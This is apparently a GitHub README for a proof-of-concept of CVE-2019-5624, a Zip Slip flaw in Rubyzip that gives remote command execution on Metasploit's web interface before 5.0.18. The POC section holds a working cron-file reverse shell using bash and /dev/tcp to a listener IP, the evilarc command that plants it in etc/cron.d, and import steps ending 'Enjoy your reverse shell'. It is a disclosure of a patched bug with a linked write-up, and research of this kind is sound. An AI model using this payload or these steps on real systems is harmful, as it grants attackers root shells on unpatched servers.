# CVE-2019-5624
A proof of concept for Metasploit's CVE-2019-5624 vulnerability (Rubyzip insecure ZIP handling RCE)

## Intro

In February 2019 I found a new vulnerability in the Rubyzip library. It allows an attacker to exploit insecure ZIP handling ([Zip Slip](https://snyk.io/research/zip-slip-vulnerability)) resulting in remote command execution.

This vulnerability was leveraged to targets all Metasploit versions < 5.0.18 [Metasploit Wrap-Up](https://blog.rapid7.com/2019/04/19/metasploit-wrap-up-13/)

I've made this detailed [blog post](https://voidsec.com/rubyzip-metasploit-bug/) explaining the vulnerability.

## POC

+ Create a file with the following content:
```
* * * * * root /bin/bash -c "exec /bin/bash0</dev/tcp/172.16.13.144/4444 1>&0 2>&0 0<&196;exec196<>/dev/tcp/172.16.13.144/4445; bash <&196 >&196 2>&196"
```
+ Generate the ZIP archive with the path traversal payload: 
```
python evilarc.py exploit --os unix -p etc/cron.d/
```
+ Add a valid MSF workspace to the ZIP file (in order to have MSF to extract it, otherwise it will refuse to process the ZIP archive)
+ Setup two listeners, one on port 4444 and the other on port 4445 (the one on port 4445 will get the reverse shell)
+ Login in the MSF Web Interface
+ Create a new “Project”
+ Select “Import”, “From file”, chose the evil ZIP file and finally click the “Import” button
+ Wait for the import process to finish
+ Enjoy your reverse shell

## Video
[![](http://img.youtube.com/vi/79Dl-Ylu6Ig/0.jpg)](http://www.youtube.com/watch?v=79Dl-Ylu6Ig "https://voidsec.com/wp-content/uploads/2019/04/metasploit-og-463x348.png")
